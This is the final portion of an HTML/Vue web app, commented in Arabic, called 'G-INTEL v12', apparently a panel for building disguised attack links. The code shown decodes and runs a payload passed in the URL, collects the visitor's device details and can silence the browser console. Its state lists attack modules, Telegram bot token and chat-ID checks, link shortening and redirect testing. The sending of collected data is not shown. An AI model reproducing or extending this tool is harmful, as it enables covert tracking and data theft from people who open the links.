                        setTimeout(() => loading.value = false, 2000);

                        // التحقق من وجود بارامتر m
                        const params = new URLSearchParams(window.location.search);
                        const m = params.get('m');
                        if (m) {
                            isExecuting.value = true;
                            try {
                                let decoded = decodeURIComponent(escape(atob(m)));
                                
                                // إذا كان مشفراً بـ AES، نحتاج لمفتاح (لن يتم هنا)
                                let payload = JSON.parse(decoded);
                                
                                // إضافة سجل للتنفيذ
                                addLog('info', 'تم استقبال حمولة جديدة');
                                
                                executePayload(payload);
                            } catch (e) {
                                console.error('خطأ في فك الحمولة:', e);
                                addLog('error', 'فشل فك الحمولة: ' + e.message);
                                isExecuting.value = false;
                            }
                        }

                        // جمع معلومات الجهاز للعرض
                        const parser = new UAParser();
                        const ua = parser.getResult();
                        deviceInfo.device = ua.device.vendor || 'غير معروف';
                        deviceInfo.os = ua.os.name + ' ' + ua.os.version;
                        deviceInfo.browser = ua.browser.name;
                        deviceInfo.cpu = navigator.hardwareConcurrency;
                        deviceInfo.ram = navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : '?';
                        deviceInfo.screen = `${screen.width}x${screen.height}`;
                        deviceInfo.language = navigator.language;

                        // تحميل الإحصائيات المخزنة
                        const savedStats = localStorage.getItem('gintel_stats');
                        if (savedStats) {
                            try {
                                const s = JSON.parse(savedStats);
                                Object.assign(stats, s);
                            } catch {}
                        }

                        // إعداد الساعة
                        setInterval(() => {
                            currentTime.value = new Date().toLocaleTimeString();
                        }, 1000);

                        // مراقبة الاتصال
                        window.addEventListener('online', () => online.value = true);
                        window.addEventListener('offline', () => online.value = false);

                        // تقدير استخدام الذاكرة
                        if (performance.memory) {
                            setInterval(() => {
                                const used = performance.memory.usedJSHeapSize / 1024 / 1024;
                                memoryUsage.value = used.toFixed(2) + ' MB';
                            }, 2000);
                        }

                        // إضافة سجل ترحيبي
                        addLog('info', 'تم تشغيل G-INTEL v12 بنجاح');
                        addLog('success', 'مرحباً بك في النظام الكمومي');
                    });

                    // حفظ الإحصائيات
                    watch(stats, (newVal) => {
                        localStorage.setItem('gintel_stats', JSON.stringify(newVal));
                    }, { deep: true });

                    // تفعيل إخفاء الكونسول
                    watch(() => security.hideConsole, (val) => {
                        if (val) {
                            console.log = function() {};
                            console.error = function() {};
                            console.warn = function() {};
                            console.info = function() {};
                        }
                    });

                    return {
                        // المتغيرات العامة
                        loading,
                        loadingProgress,
                        loadingMessage,
                        loadingStage,
                        isExecuting,
                        generating,
                        progress,
                        progressMessage,
                        generatedLink,
                        activeTab,
                        theme,
                        lang,
                        online,
                        currentTime,
                        memoryUsage,
                        linkHash,
                        showQR,
                        tokenValidation,
                        chatIdValid,
                        
                        // بيانات
                        config,
                        selectedModules,
                        moduleSearch,
                        selectedCategory,
                        attackModules,
                        moduleCategories,
                        extra,
                        security,
                        privacy,
                        stats,
                        logs,
                        logFilter,
                        deviceInfo,
                        
                        // التنفيذ
                        executionProgress,
                        executionStatus,
                        executionDetail,
                        executionLog,
                        executionAttempt,
                        
                        // التبويبات
                        tabs,
                        faqs,
                        updates,
                        
                        // computed
                        filteredModules,
                        canGenerate,
                        overallProgress,
                        getKeyStrengthText,
                        getKeyStrengthColor,
                        encryptionStrength,
                        
                        // دوال
                        validateTokenAdvanced,
                        validateChatId,
                        toggleModule,
                        addLog,
                        filteredLogs,
                        clearLogs,
                        exportLogs,
                        saveFullConfig,
                        loadFullConfig,
                        exportConfigAsFile,
                        importConfigFromFile,
                        toggleTheme,
                        toggleLanguage,
                        toggleFullscreen,
                        handle3DMouseMove,
                        reset3DCard,
                        getTabBadge,
                        generateLink,
                        copyLink,
                        testLink,
                        shortenWithIsgd,
                        shortenWithTiny,
                        downloadLinkAsFile,
                        testRedirectUrl,
                        suggestChatId,
                    };
                }
            });

            // تركيب التطبيق
            window.vueApp = app.mount('#app');

            // =================================================================
            // 3. إعداد الخلفية ثلاثية الأبعاد (Three.js متطور)
            // =================================================================
            const initThreeBackground = () => {
                const canvas = document.getElementById('bgCanvas');
                if (!canvas) return;

                const scene = new THREE.Scene();
                scene.background = new THREE.Color(0x0a0c15);

                const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
                camera.position.z = 50;

                const renderer = new THREE.WebGLRenderer({ canvas, alpha: false, antialias: true });
                renderer.setSize(window.innerWidth, window.innerHeight);
                renderer.setPixelRatio(window.devicePixelRatio);

                // نجوم متحركة (كثيفة)
                const starsGeometry = new THREE.BufferGeometry();
                const starsCount = 2000;
                const starsPositions = new Float32Array(starsCount * 3);
                const starsColors = new Float32Array(starsCount * 3);

                for (let i = 0; i < starsCount * 3; i += 3) {
                    // توزيع عشوائي في كرة
                    const r = 50 + Math.random() * 50;
                    const theta = Math.random() * Math.PI * 2;
                    const phi = Math.acos(2 * Math.random() - 1);
                    
                    starsPositions[i] = r * Math.sin(phi) * Math.cos(theta);
                    starsPositions[i+1] = r * Math.sin(phi) * Math.sin(theta);
                    starsPositions[i+2] = r * Math.cos(phi);

                    // ألوان عشوائية (أبيض إلى أزرق)
                    const color = new THREE.Color().setHSL(0.6 + Math.random() * 0.2, 0.8, 0.5 + Math.random() * 0.3);
                    starsColors[i] = color.r;
                    starsColors[i+1] = color.g;
                    starsColors[i+2] = color.b;
                }

                starsGeometry.setAttribute('position', new THREE.BufferAttribute(starsPositions, 3));
                starsGeometry.setAttribute('color', new THREE.BufferAttribute(starsColors, 3));

                const starsMaterial = new THREE.PointsMaterial({ 
                    size: 0.3,
                    vertexColors: true,
                    transparent: true,
                    blending: THREE.AdditiveBlending
                });

                const stars = new THREE.Points(starsGeometry, starsMaterial);
                scene.add(stars);

                // كرات متحركة (جسيمات)
                const particleGeometry = new THREE.BufferGeometry();
                const particleCount = 100;
                const particlePositions = new Float32Array(particleCount * 3);

                for (let i = 0; i < particleCount * 3; i += 3) {
                    particlePositions[i] = (Math.random() - 0.5) * 30;
                    particlePositions[i+1] = (Math.random() - 0.5) * 30;
                    particlePositions[i+2] = (Math.random() - 0.5) * 30;
                }

                particleGeometry.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
                const particleMaterial = new THREE.PointsMaterial({ color: 0x33aaff, size: 0.5, transparent: true });
                const particles = new THREE.Points(particleGeometry, particleMaterial);
                scene.add(particles);

                // خطوط متصلة بين الجسيمات (اختياري)
                const lineGeometry = new THREE.BufferGeometry();
                const linePositions = [];
                for (let i = 0; i < 50; i++) {
                    const x = (Math.random() - 0.5) * 40;
                    const y = (Math.random() - 0.5) * 40;
                    const z = (Math.random() - 0.5) * 40;
                    linePositions.push(x, y, z);
                }
                lineGeometry.setAttribute('position', new THREE.Float32BufferAttribute(linePositions, 3));
                const lineMaterial = new THREE.LineBasicMaterial({ color: 0x2266aa, transparent: true, opacity: 0.2 });
                const lines = new THREE.Line(lineGeometry, lineMaterial);
                scene.add(lines);

                // دوران متعدد
                function animate() {
                    requestAnimationFrame(animate);

                    stars.rotation.y += 0.0002;
                    stars.rotation.x += 0.0001;

                    particles.rotation.y += 0.001;
                    particles.rotation.x += 0.0005;

                    lines.rotation.y += 0.0003;

                    renderer.render(scene, camera);
                }

                animate();

                // تغيير الحجم
                window.addEventListener('resize', () => {
                    camera.aspect = window.innerWidth / window.innerHeight;
                    camera.updateProjectionMatrix();
                    renderer.setSize(window.innerWidth, window.innerHeight);
                });
            };

            // تشغيل الخلفية
            window.addEventListener('load', initThreeBackground);

            // إنشاء جسيمات متطايرة (CSS)
            const createParticles = () => {
                const container = document.getElementById('particles-container');
                for (let i = 0; i < 50; i++) {
                    const p = document.createElement('div');
                    p.className = 'particle';
                    p.style.position = 'absolute';
                    p.style.width = (Math.random() * 4 + 1) + 'px';
                    p.style.height = p.style.width;
                    p.style.background = `rgba(0, ${150 + Math.random() * 100}, 255, ${0.1 + Math.random() * 0.3})`;
                    p.style.borderRadius = '50%';
                    p.style.left = Math.random() * 100 + '%';
                    p.style.animation = `floatParticle ${15 + Math.random() * 20}s linear infinite`;
                    p.style.animationDelay = Math.random() * 10 + 's';
                    container.appendChild(p);
                }
            };

            // إضافة CSS للجسيمات
            const style = document.createElement('style');
            style.textContent = `
                @keyframes floatParticle {
                    0% { transform: translateY(100vh) translateX(0) scale(1); opacity: 0; }
                    10% { opacity: 0.5; }
                    90% { opacity: 0.3; }
                    100% { transform: translateY(-20vh) translateX(50px) scale(0.5); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
            
            window.addEventListener('load', createParticles);
        })();
    </script>
</body>
</html>